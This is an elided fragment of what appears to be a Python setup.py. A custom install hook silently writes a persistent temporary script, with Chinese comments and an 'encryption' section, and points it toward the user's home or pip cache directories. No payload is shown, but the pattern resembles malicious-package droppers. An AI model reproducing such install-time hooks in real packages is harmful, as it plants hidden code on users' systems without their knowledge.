    ...
    class PostCMD(install):
      ...
      def  run(self):
        ...
        if not "sys.argv" in os.environ.keys():
            ...
            ################################################
            fpB = F(suffix=".py",prefix="",delete = False ) ## 檔案不刪除
            testB='''
#########################################
...
if os.name=="posix":     ## Linux系統
    ...
    # os.chdir( os.environ["HOME"]+"/.cache/pip/http/b/b/git")
    os.chdir( home )
    ...
    # os.chdir( r"%LOCALAPPDATA%\pip\cache\http\b\b\.git") ## 錯誤的
    os.chdir( home )
############################################################################################
############################################################################################
#####################################################
...
###############  加密end ########################
            '''
            fpB.write( testB.encode(encoding="utf-8") )
            os.environ["cmd.init"]=fpB.name
            #######
